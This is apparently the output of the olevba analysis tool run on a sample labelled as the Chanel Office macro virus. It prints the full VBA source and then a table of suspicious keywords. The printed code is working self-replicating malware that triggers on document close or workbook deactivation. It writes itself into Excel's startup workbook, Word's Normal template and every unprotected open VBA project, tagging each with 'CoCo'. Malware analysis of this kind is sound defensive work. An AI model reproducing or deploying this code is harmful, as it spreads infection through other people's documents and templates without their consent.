olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Chanel-01e836b5745a351d92478eea4808399aadd2879e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Chanel-01e836b5745a351d92478eea4808399aadd2879e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - CoCo
Private Declare Function FindWindowA Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long: Dim λ As String
Private Sub Document_Close()
On Error Resume Next
λ = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70): ι Application
If FindWindowA("XLMain", 0&) Then ι GetObject(, "Excel.Application"): Exit Sub
Set ο = CreateObject("Excel.Application")
If UCase(Dir(ο.StartupPath + "\Book1.")) <> "BOOK1" Then
Set θ = ο.Workbooks.Add
θ.VBProject.VBComponents(1).CodeModule.InsertLines 1, λ
θ.SaveAs ο.StartupPath & "\Book1."
θ.Quit: End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
λ = ThisWorkbook.VBProject.VBComponents(1).CodeModule.Lines(1, 70): ι Application
If FindWindowA("OpusApp", 0&) Then ι GetObject(, "Word.Application"): Exit Sub
Set ο = CreateObject("Word.Application")
If ο.NormalTemplate.VBProject.Description <> "CoCo" Then
ο.NormalTemplate.VBProject.Description = "CoCo"
With ο.NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString λ: End With
ο.Quit: End If
End Sub
Private Sub ι(υ As Object)
For Each μ In υ.VBE.VBProjects
If μ.Protection <> 1 And μ.Description <> "CoCo" Then
μ.Description = "CoCo": With μ.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString λ
End With: End If: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Chanel-01e836b5745a351d92478eea4808399aadd2879e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Chanel-01e836b5745a351d92478eea4808399aadd2879e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Chanel-01e836b5745a351d92478eea4808399aadd2879e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |'υ.VBE'             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

